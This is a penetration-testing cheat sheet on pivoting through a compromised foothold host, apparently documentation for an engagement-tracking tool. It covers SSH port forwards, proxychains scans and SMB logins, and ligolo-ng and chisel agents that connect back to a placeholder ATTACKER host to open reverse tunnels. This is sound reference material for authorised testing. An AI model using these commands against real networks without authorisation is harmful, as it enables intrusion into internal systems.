# Pivoting & tunneling — quick glance

Once you own a foothold host, the interesting targets are usually on segments
you can't reach directly. Pivoting routes your tools through that foothold so
later-phase scans and exploits even work. Draw each hop in `siege` as a `pivot`
edge so the graph shows how access actually flows.

> Rule: get a reliable route to the next segment before you start scanning it —
> half of "the exploit failed" is really "the packets never arrived."

## Pick the right tool for the access you have

| You have | Use | Gives you |
|---|---|---|
| SSH to the foothold | OpenSSH port-forwards | quick, no upload needed |
| A shell (no SSH) | **ligolo-ng** or **chisel** | a full routed tunnel / SOCKS |
| Creds only, Windows | SOCKS via your C2, or `netexec` relay | proxied exec |

## SSH forwards (when you have SSH)

```bash
ssh -D 1080 user@FOOTHOLD                     # dynamic SOCKS proxy on :1080
ssh -L 8080:INTERNAL:80 user@FOOTHOLD         # local: reach one internal port
ssh -R 9001:127.0.0.1:9001 user@FOOTHOLD      # remote: expose your port to them
```

Then point tools through the SOCKS proxy:

```bash
proxychains4 nmap -sT -Pn -n -p445,3389 INTERNAL   # -sT (full connect) through SOCKS
proxychains4 nxc smb INTERNAL -u user -p pass
```

## ligolo-ng (clean routed tunnel — preferred for a shell)

```bash
# Attacker: start the proxy + a tun interface
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert

# Foothold: run the agent back to you
./agent -connect ATTACKER:11601 -ignore-cert

# Attacker (ligolo console): add a route to the internal subnet, then just use
# normal tools — no proxychains needed
session ; start ; then: sudo ip route add 10.20.0.0/24 dev ligolo
```

## chisel (SOCKS over HTTP — good through restrictive egress)

```bash
# Attacker (server)
./chisel server -p 8000 --reverse
# Foothold (client) -> reverse SOCKS back to the attacker on :1080
./chisel client ATTACKER:8000 R:1080:socks
proxychains4 <tool> INTERNAL
```

## Gotchas

- **Use TCP connect scans through tunnels** (`nmap -sT -Pn -n`); SOCKS can't
  carry raw SYN/UDP. UDP and OS detection won't traverse a SOCKS proxy.
- Keep tunnels few and labeled — a tangle of forwards is its own outage.
- Transferring `chisel`/`agent` to the target is an action worth an evidence
  note; binaries may trip EDR.
- Scans *through* a pivot are slower — scope ports tightly.

## Record in siege

Draw a `pivot` edge foothold → newly reachable host (label it with the method,
e.g. "ligolo tun" / "ssh -D"). As you compromise the far side, advance its
state and pin evidence. The wallboard then shows the real route into each
segment. See [evidence-discipline.md](evidence-discipline.md).
